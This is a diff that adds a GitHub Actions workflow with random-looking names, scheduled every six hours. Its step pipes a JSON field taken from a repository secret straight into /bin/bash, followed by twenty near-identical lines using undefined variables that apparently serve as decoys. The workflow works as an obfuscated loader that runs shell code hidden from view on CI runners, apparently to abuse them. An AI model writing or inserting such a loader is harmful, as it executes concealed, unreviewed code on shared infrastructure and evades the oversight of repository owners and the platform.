@@ -1,0 +1,38 @@
+name: ttaojagei
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ttaojagei
+        env:
+          r44917: ${{ secrets.r44917 }}
+        run: |
+          echo $r44917 | jq -r .cockq644 | /bin/bash
+          echo $iyisq63 | jq -r .p2 | /bin/bash
+          echo $roq5 | jq -r .cjh5 | /bin/bash
+          echo $fqo66897 | jq -r .x71 | /bin/bash
+          echo $p2 | jq -r .dlujf7130 | /bin/bash
+          echo $wvjc03 | jq -r .vtz76742 | /bin/bash
+          echo $ydifd4549 | jq -r .vz00097 | /bin/bash
+          echo $dfo1 | jq -r .mai09777 | /bin/bash
+          echo $zbl56 | jq -r .zsytp391 | /bin/bash
+          echo $qptyn342 | jq -r .zb3 | /bin/bash
+          echo $atfl61251 | jq -r .mm4 | /bin/bash
+          echo $fl15 | jq -r .g688 | /bin/bash
+          echo $g70588 | jq -r .sfaa273 | /bin/bash
+          echo $nuop5402 | jq -r .ew8 | /bin/bash
+          echo $gcnv2399 | jq -r .n8 | /bin/bash
+          echo $qcd152 | jq -r .jbb4 | /bin/bash
+          echo $kbimr16 | jq -r .ve97195 | /bin/bash
+          echo $zb28 | jq -r .s447 | /bin/bash
+          echo $zngbv2794 | jq -r .ckw88774 | /bin/bash
+          echo $mtcvp89 | jq -r .srv4423 | /bin/bash
+          echo $dkn23 | jq -r .yfx72791 | /bin/bash
+          echo $atils4 | jq -r .d2788 | /bin/bash
+
